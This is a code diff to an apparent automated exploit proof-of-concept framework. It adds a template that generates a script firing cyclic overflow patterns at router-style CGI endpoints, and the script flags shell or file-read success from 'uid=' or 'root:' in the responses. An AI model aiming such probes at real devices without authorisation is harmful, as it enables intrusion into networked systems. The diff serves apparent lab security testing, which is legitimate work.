@@ -494,6 +494,100 @@ def _generate_info_disclosure(ctx: PoCContext) -> str:
     )
 
 
+def _generate_memory_stateful_probe(ctx: PoCContext) -> str:
+    chain_literal = json.dumps(ctx.chain_id)
+    service_literal = json.dumps(ctx.target_service)
+    candidate_literal = json.dumps(ctx.candidate_id)
+    summary_literal = json.dumps(ctx.candidate_summary)
+    return textwrap.dedent(
+        f"""\
+        from __future__ import annotations
+
+        import hashlib
+        import http.client
+        import urllib.parse
+        from datetime import datetime, timezone
+
+
+        class PoCResult:
+            def __init__(self, success: bool, proof_type: str, proof_evidence: str, timestamp: str) -> None:
+                self.success = success
+                self.proof_type = proof_type
+                self.proof_evidence = proof_evidence
+                self.timestamp = timestamp
+
+
+        def _utc_now() -> str:
+            return datetime.now(tz=timezone.utc).replace(microsecond=0).isoformat().replace("+00:00", "Z")
+
+
+        def _cyclic(length: int) -> str:
+            alphabet = "abcdefghijklmnopqrstuvwxyz"
+            out = []
+            for a in alphabet:
+                for b in alphabet:
+                    for c in alphabet:
+                        out.append(a + b + c)
+                        if len("".join(out)) >= length:
+                            return "".join(out)[:length]
+            return ("".join(out) * ((length // max(1, len("".join(out)))) + 1))[:length]
+
+
+        class PoC:
+            chain_id = {chain_literal}
+            target_service = {service_literal}
+
+            def setup(self, target_ip: str, target_port: int, *, context: dict[str, object]) -> None:
+                self.target_ip = target_ip
+                self.target_port = target_port
+                self.context = context
+
+            def execute(self) -> PoCResult:
+                timestamp = _utc_now()
+                marker = "SCOUT_PROOF"
+                pattern = _cyclic(384)
+                evidence_prefix = (
+                    "autopoc_mode=deterministic_lab_proof "
+                    + "candidate_id="
+                    + {candidate_literal}
+                    + " summary="
+                    + {summary_literal}
+                    + " probe=memory_stateful"
+                )
+                probes = [
+                    ("GET", "/cgi-bin/test?data=" + urllib.parse.quote(pattern)),
+                    ("GET", "/apply.cgi?payload=" + urllib.parse.quote(pattern)),
+                    ("GET", "/goform/set?input=" + urllib.parse.quote(pattern)),
+                    ("GET", "/?probe=" + marker),
+                ]
+                for method, path in probes:
+                    try:
+                        conn = http.client.HTTPConnection(self.target_ip, int(self.target_port), timeout=3.0)
+                        conn.request(method, path, headers={{"Connection": "close"}})
+                        resp = conn.getresponse()
+                        body = resp.read(4096)
+                        conn.close()
+                        digest = hashlib.sha256(body).hexdigest()
+                        evidence = (
+                            evidence_prefix
+                            + f" port={{self.target_port}} path={{path}} status={{resp.status}}"
+                            + f" bytes={{len(body)}} readback_hash={{digest}}"
+                        )
+                        if b"uid=" in body:
+                            return PoCResult(True, "shell", evidence, timestamp)
+                        if b"SCOUT_LEAK:" in body or b"root:" in body:
+                            return PoCResult(True, "arbitrary_read", evidence, timestamp)
+                    except Exception:
+                        continue
+                evidence = evidence_prefix + f" port={{self.target_port}} bytes=0 readback_hash=none result=no_memory_primitive_confirmed"
+                return PoCResult(False, "arbitrary_read", evidence, timestamp)
+
+            def cleanup(self) -> None:
+                return
+        """
+    )
+
+
 # ---------------------------------------------------------------------------
 # Register built-in templates
 # ---------------------------------------------------------------------------
@@ -560,5 +654,22 @@ register_template(
         }),
         description="Sensitive information disclosure probe via known debug/config paths",
         generate=_generate_info_disclosure,
+    )
+)
+
+register_template(
+    PoCTemplate(
+        vuln_type="memory_stateful_probe",
+        families=frozenset({
+            "memory_corruption_candidate",
+            "protocol_stateful_probe",
+            "stack_overflow",
+            "heap_corruption",
+            "buffer_overflow",
+            "controlled_write",
+            "controlled_read",
+        }),
+        description="Bounded lab-only cyclic/stateful memory primitive probe",
+        generate=_generate_memory_stateful_probe,
     )
 )
